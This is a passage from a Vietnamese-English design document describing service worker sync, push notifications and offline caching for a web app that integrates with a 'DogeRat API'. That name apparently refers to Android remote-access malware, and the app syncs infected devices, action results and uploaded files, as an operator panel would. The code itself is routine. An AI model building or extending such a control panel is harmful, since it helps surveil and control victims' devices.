        const response = await fetch('/api/v1/devices');
        const devices = await response.json();
        
        // Store in IndexedDB for offline access
        await storeDevicesInIndexedDB(devices.data);
        
        // Broadcast to clients
        const clients = await self.clients.matchAll();
        clients.forEach((client) => {
            client.postMessage({
                type: 'devices-synced',
                data: devices.data
            });
        });
    } catch (error) {
        console.error('Background sync failed:', error);
    }
}

async function syncActionResultsFromAPI() {
    try {
        const response = await fetch('/api/v1/actions/results');
        const results = await response.json();
        
        // Store in IndexedDB for offline access
        await storeActionResultsInIndexedDB(results.data);
        
        // Broadcast to clients
        const clients = await self.clients.matchAll();
        clients.forEach((client) => {
            client.postMessage({
                type: 'action-results-synced',
                data: results.data
            });
        });
    } catch (error) {
        console.error('Background sync failed:', error);
    }
}

async function syncFileUploadsFromAPI() {
    try {
        const response = await fetch('/api/v1/uploads/pending');
        const uploads = await response.json();
        
        // Process pending uploads
        for (const upload of uploads.data) {
            await processFileUpload(upload);
        }
    } catch (error) {
        console.error('Background sync failed:', error);
    }
}
```

### 19.5. Background Sync API

**Background Sync Registration:**
```javascript
// Register background sync
async function syncDeviceData() {
    const registration = await navigator.serviceWorker.ready;
    await registration.sync.register('sync-device-data');
}

// Service Worker: Handle background sync
self.addEventListener('sync', (event) => {
    if (event.tag === 'sync-device-data') {
        event.waitUntil(syncDevicesFromAPI());
    }
});
```

### 19.6. Integration with DogeRat API

**Background API Calls:**
- Service Worker có thể gọi DogeRat API endpoints trong background
- Background sync device data từ DogeRat API
- Execute actions trong background
- Receive real-time updates via Socket.IO trong background

**URL Configuration:**
- DogeRat API endpoints sử dụng cùng URL với web app
- Service Worker proxy requests tới DogeRat API
- Background sync sử dụng relative URLs

**Implementation:**
```javascript
// Service Worker: Background API calls
self.addEventListener('sync', async (event) => {
    if (event.tag === 'sync-devices') {
        event.waitUntil(
            fetch('/api/v1/devices')
                .then(response => response.json())
                .then(data => {
                    // Store in IndexedDB for offline access
                    return storeDevicesInDB(data);
                })
        );
    }
});
```

### 19.7. Push Notifications

**Push Notification Setup:**
```javascript
// Request notification permission
const permission = await Notification.requestPermission();

if (permission === 'granted') {
    // Subscribe to push notifications
    const subscription = await registration.pushManager.subscribe({
        userVisibleOnly: true,
        applicationServerKey: VAPID_PUBLIC_KEY
    });
    
    // Send subscription to server
    await sendSubscriptionToServer(subscription);
}
```

**Push Notification Handling:**
```javascript
// Service Worker: Handle push notifications
self.addEventListener('push', (event) => {
    const data = event.data.json();
    
    const options = {
        body: data.body,
        icon: '/icons/icon-192x192.png',
        badge: '/icons/badge-72x72.png',
        tag: data.tag,
        data: data.data
    };
    
    event.waitUntil(
        self.registration.showNotification(data.title, options)
    );
});
```

### 19.8. Offline Support

**Offline Support Features:**
- Cache essential assets
- Cache API responses
- Queue offline requests
- Store data in IndexedDB
- Sync when online

**Cache Strategies:**
- Network-first strategy cho API calls
- Cache-first strategy cho static assets
- Offline fallback pages
- Stale-while-revalidate cho performance

---

**Document Version:** 2.0.0  
**Last Updated:** January 2025  
**Author:** ZaloPay Merchant Platform Development Team  
**Verification Status:** ✅ Verified against actual codebase

